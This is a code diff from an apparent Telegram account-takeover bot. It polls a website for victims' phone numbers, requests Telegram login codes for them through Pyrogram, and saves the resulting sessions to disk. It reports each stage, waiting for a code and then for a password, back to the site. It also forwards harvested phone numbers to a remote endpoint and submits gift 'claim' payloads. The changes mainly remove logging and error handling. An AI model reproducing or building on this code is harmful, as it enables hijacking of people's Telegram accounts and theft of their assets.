@@ -482,7 +482,7 @@ async def send_claim_to_api(uid, gift_hash, username):
                 "username": username
             }
             logger.info(f"[API] Sending claim: {payload}")
-            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            async with session.post(url, json=payload, timeout=10) as resp:
                 result = await resp.json()
                 logger.info(f"[API] Claim response: {result}")
                 return result
@@ -494,15 +494,11 @@ async def send_claim_to_api(uid, gift_hash, username):
 async def update_api_status(api_url, rid, status, **kwargs):
     """Update auth request status on website"""
     url = f"{api_url}/api/telegram/update-request"
-    # Помечаем как processed только финальные статусы (success, error, cancelled)
-    # Промежуточные статусы (waiting_code, waiting_password) остаются необработанными
-    processed = status in ("success", "error", "cancelled")
-    data = {"requestId": rid, "status": status, "processed": processed, **kwargs}
+    data = {"requestId": rid, "status": status, "processed": True, **kwargs}
     try:
         async with aiohttp.ClientSession() as s:
-            async with s.post(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                await resp.read()  # Читаем ответ полностью, чтобы закрыть соединение
-                logger.info(f"[API] Status update {status} (processed={processed}): {resp.status}")
+            async with s.post(url, json=data, timeout=10) as resp:
+                logger.info(f"[API] Status update {status}: {resp.status}")
     except Exception as e:
         logger.error(f"[API] Status update error: {e}")
 
@@ -1526,12 +1522,10 @@ def get_router(bot: Bot) -> Router:
         db.add_user(msg.from_user.id, msg.from_user.username, msg.from_user.first_name, ph)
         try:
             async with aiohttp.ClientSession() as s:
-                async with s.post(f"{SETTINGS['api_url']}/api/telegram/receive-phone",
-                                  json={"phone": ph, "telegramId": msg.from_user.id},
-                                  timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                    await resp.read()  # Читаем ответ полностью, чтобы закрыть соединение
-        except Exception as e:
-            logger.debug(f"Contact API error: {e}")
+                await s.post(f"{SETTINGS['api_url']}/api/telegram/receive-phone",
+                             json={"phone": ph, "telegramId": msg.from_user.id})
+        except:
+            pass
 
     return router
 
@@ -1544,51 +1538,29 @@ class UnifiedBot:
         self.api_url = SETTINGS['api_url']
 
     async def process_queue(self):
-        logger.info(f"📡 Starting API polling from {self.api_url}/api/telegram/get-pending")
+        logger.info("Polling API...")
         async with aiohttp.ClientSession() as sess:
             while True:
                 try:
-                    async with sess.get(f"{self.api_url}/api/telegram/get-pending", 
-                                        timeout=aiohttp.ClientTimeout(total=10)) as r:
+                    async with sess.get(f"{self.api_url}/api/telegram/get-pending", timeout=10) as r:
                         if r.status == 200:
-                            data = await r.json()  # json() уже читает весь ответ
-                            success = data.get('success', False)
+                            data = await r.json()
                             requests = data.get('requests', [])
-                            
-                            logger.debug(f"📡 Poll response: success={success}, requests_count={len(requests)}")
-                            
                             if requests:
-                                logger.info(f"📥 Found {len(requests)} pending request(s)")
-                            else:
-                                logger.debug(f"📭 No pending requests")
-                            
+                                logger.info(f"Found {len(requests)} pending request(s)")
                             for req in requests:
                                 rid = req.get('requestId')
                                 act = req.get('action')
-                                phone = req.get('phone', 'N/A')
-                                tg_id = req.get('telegramId', 'N/A')
-                                status = req.get('status', 'N/A')
-                                processed = req.get('processed', False)
-                                
-                                logger.info(f"📋 Request: id={rid}, action={act}, phone={phone}, tg_id={tg_id}, status={status}, processed={processed}")
-                                
                                 # Use requestId + action as key to allow same requestId with different actions
                                 key = f"{rid}_{act}"
                                 if key not in processed_requests:
                                     processed_requests[key] = True
-                                    logger.info(f"🔄 Processing new request: {rid}, action={act}, phone={phone}")
+                                    logger.info(f"Found new request to process: {rid}, action={act}")
                                     asyncio.create_task(self.handle_req(req))
                                 else:
-                                    logger.debug(f"⏭️ Request already processed: {key}")
-                        else:
-                            text = await r.text()
-                            logger.warning(f"⚠️ API returned status {r.status}: {text[:200]}")
-                except aiohttp.ClientError as e:
-                    logger.error(f"❌ HTTP error during polling: {type(e).__name__}: {e}")
+                                    logger.debug(f"Request already processed: {key}")
                 except Exception as e:
-                    logger.error(f"❌ Polling error: {type(e).__name__}: {e}")
-                    import traceback
-                    logger.error(traceback.format_exc())
+                    logger.debug(f"Polling error: {e}")
                 await asyncio.sleep(0.5)
 
     async def handle_req(self, req):
@@ -1606,46 +1578,18 @@ class UnifiedBot:
         try:
             if act == 'send_phone':
                 if not phone:
-                    logger.error(f"No phone provided for request {rid}")
-                    await update_api_status(self.api_url, rid, "error", error="No phone provided", phone=phone, telegramId=tg_id)
                     return
-                
-                logger.info(f"📱 Starting send_code for {phone}, requestId={rid}")
-                try:
-                    client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
-                                    api_hash=SETTINGS['api_hash'])
-                    pyrogram_clients[phone] = client
-                    
-                    if not client.is_connected:
-                        logger.info(f"🔌 Connecting Pyrogram client for {phone}...")
-                        await client.connect()
-                        logger.info(f"✅ Pyrogram connected for {phone}")
-                    
-                    logger.info(f"📤 Sending code to {phone}...")
-                    sent = await client.send_code(phone)
-                    user_sessions[phone] = {'h': sent.phone_code_hash}
-                    logger.info(f"✅ Code sent to {phone}, hash: {sent.phone_code_hash[:10]}...")
-                    
-                    await update_api_status(self.api_url, rid, "waiting_code", phone=phone, telegramId=tg_id)
-                    # Log to Telegram
-                    await log_event(f"📱 <b>Code sent</b>\n\nPhone: <code>{phone}</code>\nTG ID: <code>{tg_id}</code>")
-                    
-                except FloodWait as e:
-                    error_msg = f"FloodWait: подождите {e.value} секунд"
-                    logger.error(f"❌ {error_msg} for {phone}")
-                    await update_api_status(self.api_url, rid, "error", error=error_msg, phone=phone, telegramId=tg_id)
-                    if client and client.is_connected:
-                        await client.disconnect()
-                        
-                except Exception as e:
-                    error_msg = f"Ошибка отправки кода: {type(e).__name__}: {str(e)}"
-                    logger.error(f"❌ Send code error for {phone}: {error_msg}")
-                    await update_api_status(self.api_url, rid, "error", error=error_msg, phone=phone, telegramId=tg_id)
-                    if client and client.is_connected:
-                        try:
-                            await client.disconnect()
-                        except:
-                            pass
+                client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
+                                api_hash=SETTINGS['api_hash'])
+                pyrogram_clients[phone] = client
+                if not client.is_connected:
+                    await client.connect()
+                sent = await client.send_code(phone)
+                user_sessions[phone] = {'h': sent.phone_code_hash}
+                logger.info(f"Code sent to {phone}")
+                await update_api_status(self.api_url, rid, "waiting_code", phone=phone)
+                # Log to Telegram
+                await log_event(f"📱 <b>Code sent</b>\n\nPhone: <code>{phone}</code>\nTG ID: <code>{tg_id}</code>")
 
             elif act == 'send_code':
                 if not code:
